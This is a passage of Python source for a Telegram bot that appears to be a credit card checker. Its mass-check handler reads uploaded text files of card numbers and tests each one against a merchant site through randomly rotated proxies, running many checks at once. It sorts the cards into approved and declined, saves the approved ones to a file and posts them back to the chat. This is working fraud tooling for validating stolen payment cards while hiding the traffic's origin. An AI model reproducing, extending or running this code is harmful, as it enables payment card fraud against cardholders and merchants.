            "You must add at least 1 proxy before mass checking.",
            parse_mode=ParseMode.HTML
        )
        return
    
    if not data_store.sites:
        await update.message.reply_text("❌ No sites available.")
        return
    
    document = update.message.document
    
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please send a TXT file.")
        return
    
    file = await document.get_file()
    file_content = await file.download_as_bytearray()
    
    try:
        text = file_content.decode('utf-8', errors='ignore')
        ccs = extract_multiple_ccs(text)
        
        if not ccs:
            await update.message.reply_text("❌ No valid CCs found in file.")
            return
        
        if len(ccs) > MAX_MASS_CARDS:
            ccs = ccs[:MAX_MASS_CARDS]
        
        total_cards = len(ccs)
        proxy_count = len(data_store.proxies)
        concurrent_limit = get_concurrent_limit(proxy_count)
        site = random.choice(data_store.sites)
        
        status_msg = await update.message.reply_text(
            f"🔄 Processing {total_cards} cards...\n\n"
            f"Checked: 0/{total_cards}\n"
            f"✅ Approved: 0\n"
            f"❌ Declined: 0\n\n"
            f"🌐 Using {proxy_count} proxies\n"
            f"⚡ Concurrent: {concurrent_limit} cards at once"
        )
        
        approved_cards = []
        declined_cards = []
        checked_count = 0
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=concurrent_limit) as executor:
            futures = []
            
            for cc in ccs:
                proxy = random.choice(data_store.proxies)
                future = executor.submit(check_site, site, cc, proxy)
                futures.append((future, cc, proxy["string"]))
            
            for future, cc, proxy_str in futures:
                try:
                    result = future.result(timeout=REQUEST_TIMEOUT + 5)
                    checked_count += 1
                    
                    if result["status"] in ["APPROVED", "APPROVED_OTP"]:
                        approved_cards.append(cc)
                    else:
                        declined_cards.append(cc)
                    
                    data_store.update_stats(result["status"], mass_check=True)
                    
                    if checked_count % 10 == 0 or checked_count == total_cards:
                        await status_msg.edit_text(
                            f"🔄 Processing {total_cards} cards...\n\n"
                            f"Checked: {checked_count}/{total_cards}\n"
                            f"✅ Approved: {len(approved_cards)}\n"
                            f"❌ Declined: {len(declined_cards)}\n\n"
                            f"🌐 Using {proxy_count} proxies\n"
                            f"⚡ Concurrent: {concurrent_limit} cards at once"
                        )
                        
                except Exception as e:
                    declined_cards.append(cc)
                    checked_count += 1
        
        if approved_cards:
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = SCRIPTS_DIR / f"approved_{timestamp}.txt"
            with open(filename, 'w') as f:
                f.write('\n'.join(approved_cards))
        
        await status_msg.delete()
        
        results_message = format_mass_message(
            total_cards, len(approved_cards), len(declined_cards),
            site, proxy_count
        )
        
        await update.message.reply_text(results_message, parse_mode=ParseMode.HTML)
        
        if approved_cards:
            approved_text = "✅ APPROVED CARDS:\n\n" + "\n".join(approved_cards)
            if len(approved_text) > 4000:
                chunks = [approved_text[i:i+4000] for i in range(0, len(approved_text), 4000)]
                for chunk in chunks:
                    await update.message.reply_text(f"<code>{chunk}</code>", parse_mode=ParseMode.HTML)
            else:
                await update.message.reply_text(f"<code>{approved_text}</code>", parse_mode=ParseMode.HTML)
                
    except Exception as e:
        logger.error(f"Error processing file: {e}")
        await update.message.reply_text("❌ Error reading file.")

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle errors"""
    logger.error(f"Update {update} caused error {context.error}")
    
    if update and update.effective_message:
        try:
            await update.effective_message.reply_text(
                "❌ An error occurred while processing your request."
            )
        except:
            pass

# ========== MAIN FUNCTION ==========
def main():
    """Start the bot"""
    print(f"🤖 Bot starting up...")
    print(f"🌐 Proxies loaded: {len(data_store.proxies)}")
    print(f"🔗 Sites loaded: {len(data_store.sites)}")
    print(f"📊 Total checks: {data_store.stats['total_checks']}")
    print(f"✅ Approved: {data_store.stats['approved']}")
    print(f"❌ Declined: {data_store.stats['declined']}")
    
    print(f"🔑 Using token: {BOT_TOKEN[:10]}...")
    
    application = Application.builder().token(BOT_TOKEN).build()
    
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("chk", chk_command))
    application.add_handler(CommandHandler("mass", mass_command))
    application.add_handler(CommandHandler("addproxy", addproxy_command))
    application.add_handler(CommandHandler("listproxies", listproxies_command))
    application.add_handler(CommandHandler("clearproxies", clearproxies_command))
    application.add_handler(CommandHandler("testproxy", testproxy_command))
    application.add_handler(CommandHandler("addsite", addsite_command))
    application.add_handler(CommandHandler("listsites", listsites_command))
    application.add_handler(CommandHandler("stats", stats_command))
    
    application.add_handler(MessageHandler(filters.Document.FileExtension("txt"), handle_document))
    
    application.add_error_handler(error_handler)
    
    print("🚀 Bot is running...")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
